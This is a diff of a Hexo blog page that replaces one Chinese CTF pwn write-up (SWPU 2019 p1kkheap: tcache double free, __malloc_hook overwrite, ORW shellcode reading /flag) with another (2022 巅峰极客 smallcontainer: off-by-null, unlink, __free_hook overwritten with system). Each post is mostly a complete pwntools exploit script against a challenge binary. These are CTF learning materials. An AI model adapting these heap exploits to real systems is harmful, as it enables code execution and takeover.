@@ -20,20 +20,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="攻击tcache_struct,double free,uaf,orw">
+  <meta name="description" content="pwn,unlink,unsortedbins,off-by-null">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SWPU 2019 p1kkheap">
-<meta property="og:url" content="http://example.com/2023/10/11/SWPU-2019-p1kkheap/index.html">
+<meta property="og:title" content="2022-巅峰极客-smallcontainer">
+<meta property="og:url" content="http://example.com/2023/11/12/2022-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-smallcontainer/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="攻击tcache_struct,double free,uaf,orw">
+<meta property="og:description" content="pwn,unlink,unsortedbins,off-by-null">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-10-11T02:30:09.000Z">
-<meta property="article:modified_time" content="2023-10-11T02:34:36.765Z">
+<meta property="article:published_time" content="2023-11-12T11:23:18.000Z">
+<meta property="article:modified_time" content="2023-11-12T11:30:45.700Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2023/10/11/SWPU-2019-p1kkheap/">
+<link rel="canonical" href="http://example.com/2023/11/12/2022-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-smallcontainer/">
 
 
 <script id="page-configurations">
@@ -46,7 +47,7 @@
   };
 </script>
 
-  <title>SWPU 2019 p1kkheap | Hexo</title>
+  <title>2022-巅峰极客-smallcontainer | Hexo</title>
   
 
 
@@ -156,7 +157,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/11/SWPU-2019-p1kkheap/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/12/2022-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-smallcontainer/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +170,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SWPU 2019 p1kkheap
+          2022-巅峰极客-smallcontainer
         </h1>
 
         <div class="post-meta">
@@ -180,11 +181,11 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-10-11 10:30:09 / Modified: 10:34:36" itemprop="dateCreated datePublished" datetime="2023-10-11T10:30:09+08:00">2023-10-11</time>
+              <time title="Created: 2023-11-12 19:23:18 / Modified: 19:30:45" itemprop="dateCreated datePublished" datetime="2023-11-12T19:23:18+08:00">2023-11-12</time>
             </span>
 
           
-            <div class="post-description">攻击tcache_struct,double free,uaf,orw</div>
+            <div class="post-description">pwn,unlink,unsortedbins,off-by-null</div>
 
         </div>
       </header>
@@ -195,12 +196,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p> glibc-2.27</p>
-<p>PIE开启</p>
-<p>存在uaf和double</p>
-<p>选择攻击tcache_struct，改变tcache_bin的内容泄露libc_base，改变链表头实现任意内存写</p>
-<p>同时程序开启了沙盒，需要进行orw，在buf上写orw_shellcode，修改malloc_hook为shellcode，程序限制malloc次数和free次数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28244)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;)</span><br><span class="line">def add(size):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;size: &quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def show(id):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line">def edit(id,content):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line">    r.recvuntil(&quot;content: &quot;)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">def delete(id):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line">#gdb.attach(r)</span><br><span class="line">add(0x100)#0</span><br><span class="line">add(0x100)#1</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">#pause()</span><br><span class="line">show(0)</span><br><span class="line">r.recvuntil(&quot;content: &quot;)</span><br><span class="line">heap_base=u64(r.recvuntil(&quot;\n&quot;,drop=True).ljust(8,b&quot;\x00&quot;))-0x260</span><br><span class="line">print(hex(heap_base))</span><br><span class="line">add(0x100)#2</span><br><span class="line">edit(2,p64(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x100)#3</span><br><span class="line">add(0x100)#4</span><br><span class="line">edit(4,p64(0)+p64(0x251)+b&quot;\x07&quot;*0x40)</span><br><span class="line">delete(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-96</span><br><span class="line">print(hex(main_arena_addr))</span><br><span class="line">libc.address=main_arena_addr-0x3ebc40</span><br><span class="line">print(hex(libc.address))</span><br><span class="line">malloc_hook_addr=libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line">print(hex(malloc_hook_addr))</span><br><span class="line">buf=0x66660000</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)+p64(0x251)+b&quot;\x07&quot;*0x40+p64(malloc_hook_addr)+p64(0)*5+p64(buf))</span><br><span class="line">shellcode=asm(shellcraft.open(&quot;/flag&quot;)+shellcraft.read(3,buf+0x500,0x30)+shellcraft.write(1,buf+0x500,0x30))</span><br><span class="line"></span><br><span class="line">add(0x70)#buf,5</span><br><span class="line">edit(5,shellcode)</span><br><span class="line">add(0x10)#malloc,6</span><br><span class="line"></span><br><span class="line">edit(6,p64(buf))</span><br><span class="line"></span><br><span class="line">add(0x10)</span><br><span class="line">print(r.recvline())</span><br></pre></td></tr></table></figure>
+        <p> glibc2.27</p>
+<p>程序中没有UAF，但四大功能倒是很全，有一个检查，在遇到<strong>\x11</strong>时会将其置零，这对于size位的x11是一个off-by-null，程序只允许申请0xff大小到0x3ff大小的chunk</p>
+<p>首先是通过unsorted bins泄露libc，由于没有uaf，可以用unsorted bins切割来泄露。</p>
+<p>利用off-by-null改变chunk的size，再据此，进行unlink，实现堆块覆写。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from ownpwn.pwn64 import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io=set_process(&#x27;./service&#x27;)</span><br><span class="line">#io=set_remote(&quot;node4.anna.nssctf.cn&quot;,28651)</span><br><span class="line">elf=ELF(&quot;./service&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">    sla(&quot;size: &quot;,str(size))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">    sla(&quot;index: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;,str(idx))</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line">#leak_libc</span><br><span class="line">for i in range(8):</span><br><span class="line">    add(0x250) #index 0-7</span><br><span class="line">for i in range(7, -1, -1):</span><br><span class="line">    free(i)#7-0</span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x250) #index 0-6</span><br><span class="line">add(0x120)#7</span><br><span class="line">show(7)</span><br><span class="line">libc.address=int(rx(12),16)-0x3ebef0</span><br><span class="line">add(0x120)#8</span><br><span class="line">system=libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">malloc_hook=libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">one_gadget=[0x4f2a5,0x4f302,0x10a2fc]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8,-1,-1):</span><br><span class="line">    free(i)</span><br><span class="line">for i in range(8):</span><br><span class="line">    add(0x1f0)#0-7</span><br><span class="line">add(0x108)#8</span><br><span class="line">add(0x200)#9</span><br><span class="line">add(0x108)#10</span><br><span class="line">add(0x108)#11</span><br><span class="line">for i in range(8):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">edit(8,b&#x27;\x11&#x27;*0x108)</span><br><span class="line">edit(8,b&#x27;\x11&#x27;*0x100+p16(0x310))</span><br><span class="line">edit(9,b&#x27;\x00&#x27;*0x1f8+p64(0x121))</span><br><span class="line">free(9)#此时完成了堆覆写,chunk_8被chunk_9和chunk_chunk7利用unlink,放入了unsorted_bin</span><br><span class="line"></span><br><span class="line">free(11)</span><br><span class="line">free(8)</span><br><span class="line">add(0x220)#从unsorted_bin中切割出来,可以覆写chunk_8的fd和bk</span><br><span class="line">edit(0,b&quot;\x00&quot;*0x200+p64(free_hook-8))</span><br><span class="line"></span><br><span class="line">add(0x108)#1</span><br><span class="line">add(0x108)#2</span><br><span class="line">edit(2,p64(0)+p64(system))</span><br><span class="line">edit(1,&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">io.interactive()</span><br><span class="line">log(&quot;libc--&gt;&quot;,libc.address)</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -211,6 +212,7 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
           </div>
 
         
@@ -219,13 +221,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/10/10/buckeyectf-2023/" rel="prev" title="buckeyectf-2023">
-      <i class="fa fa-chevron-left"></i> buckeyectf-2023
+    <a href="/2023/11/08/2021-%E7%A5%A5%E4%BA%91%E6%9D%AF-note/" rel="prev" title="2021-祥云杯-note">
+      <i class="fa fa-chevron-left"></i> 2021-祥云杯-note
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/10/12/intorw/" rel="next" title="intorw">
-      intorw <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
